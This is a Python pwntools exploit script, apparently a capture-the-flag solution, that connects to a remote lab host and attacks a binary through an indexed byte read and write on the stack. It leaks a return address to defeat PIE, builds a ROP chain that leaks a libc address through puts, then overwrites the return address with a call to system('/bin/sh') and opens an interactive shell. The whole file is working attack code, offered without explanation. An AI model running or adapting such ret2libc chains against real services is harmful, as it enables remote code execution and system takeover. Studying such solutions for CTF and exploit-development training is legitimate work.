from pwn import *
context.log_level = 'debug'
#p = process('./pwn')
p = remote('1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com', 57856)
file = ELF('./pwn')

p.recv()
p.send('ABC')
p.recv()


def change(i, num):
    p.sendline(str(0x158+i))
    p.recv()
    p.sendline(str(num))
    p.recv()


def write(i, num):
    basic = 0x158  # ret main start
    payload = str(hex(num)).replace('0x', '').rjust(16, '0')
    for j in range(8):
        p.sendline(str(0x158+i+j))
        p.recv()
        p.sendline(str(int(payload[2*(8-j-1):2*(8-j)], 16)))
        p.recv()


def getAddr():
    codeAddr = ''
    for i in range(8):
        p.sendline(str(0x158+i))
        p.recv()
        addr = str(p.recvuntil('\n')).split(' ')[2][-3:]
        addr = str(addr).replace('\n', '').rjust(2, '0')
        # print addr
        p.recv()
        p.sendline(str(int(addr, 16)))
        p.recv()
        codeAddr = addr+codeAddr
    print "first: "+codeAddr
    return codeAddr


def passInput(num):
    for i in range(num):
        p.sendline('1')
        p.recv()


def getTextAddr():
    codeAddr = ''
    for i in range(6):
        p.sendline(str(0x158+i))
        addr = str(p.recvuntil('\n')).split(' ')[2][-3:]
        addr = str(addr).replace('\n', '').rjust(2, '0')
        # print addr
        p.recv()
        p.sendline(str(int(addr, 16)))
        p.recv()
        codeAddr = addr+codeAddr
    print "first: "+codeAddr
    p.sendline(str(0x158+1))
    p.recv()
    t = '0x'+str(codeAddr[-4]+'d')
    tt = int(t, 16)
    p.sendline(str(tt))
    p.recv()
    p.sendline(str(0x158))
    p.recv()
    p.sendline('03')
    p.recv()
    read_got = int(codeAddr, 16)-0xb11+0x202048
    print "read_got: "+hex(read_got)

    read_got = hex(read_got)
    change(8, int(read_got[12:14], 16))
    change(9, int(read_got[10:12], 16))
    change(10, int(read_got[8:10], 16))
    change(11, int(read_got[6:8], 16))
    change(12, int(read_got[4:6], 16))
    change(13, int(read_got[2:4], 16))
    change(14, int('00', 16))
    change(15, int('00', 16))

    codeAddr = ''
    for i in range(8):
        p.sendline(str(0x158+i))
        addr = str(p.recvuntil('\n')).split(' ')[2][-3:]
        addr = str(addr).replace('\n', '').rjust(2, '0')
        # print addr
        p.recv()
        p.sendline(str(int(addr, 16)))
        p.recv()
        codeAddr = addr+codeAddr
    print 'after ret: '+codeAddr

    codeAddr = ''
    for i in range(8, 14):
        p.sendline(str(0x158+i))
        addr = str(p.recvuntil('\n')).split(' ')[2][-3:]
        addr = str(addr).replace('\n', '').rjust(2, '0')
        # print addr
        p.recv()
        p.sendline(str(int(addr, 16)))
        p.recv()
        codeAddr = addr+codeAddr
    print codeAddr
    p.sendline('1')
    p.recv()
    # newAddr = ''
    # for i in range(6):
    #     p.sendline(str(0x158+i))
    #     addr = str(p.recvuntil('\n')).split(' ')[2][-3:]
    #     addr = str(addr).replace('\n', '')
    #     #print addr
    #     p.recv()
    #     p.sendline(str(int(addr, 16)))
    #     p.recv()
    #     newAddr = addr+newAddr
    # print codeAddr
    # print newAddr
    # for i in range(27):
    #     p.sendline('0')
    #     p.sendline('0')
    #     p.recv()

    p.sendline('yes')

    p.recv()
    return codeAddr


# def passRm():
#     for i in range(35):
#         p.sendline('1')
#         p.recv()
#         p.sendline('1')
#         p.recv()

pop_rdi_offset = 0xd03
read_offset = 0x202020
puts_offset = 0x0202020


text_addr = int(getAddr(), 16)-0xb11

main_addr = text_addr+0xa65
pop_rdi_addr = text_addr+pop_rdi_offset
read_addr = text_addr+read_offset
puts_addr = text_addr+0xae9
expFunc_addr = text_addr+0xb35


write(0, pop_rdi_addr)
write(8, read_addr)
write(16, puts_addr)
passInput(19)
p.sendline('yes')

puts_libc = u64(p.recv(6)+'\x00\x00')
print hex(puts_libc)

libc_basic = puts_libc - 0x06f690

system_libc = libc_basic+0x045390
binsh_libc = libc_basic + 0x18cd57
write(0, pop_rdi_addr)
write(8, binsh_libc)
write(16, system_libc)
passInput(35)
p.recv()
p.send('icq1d5d2d0e36f9249d642e1b1f4b098')
p.recv()
p.interactive()
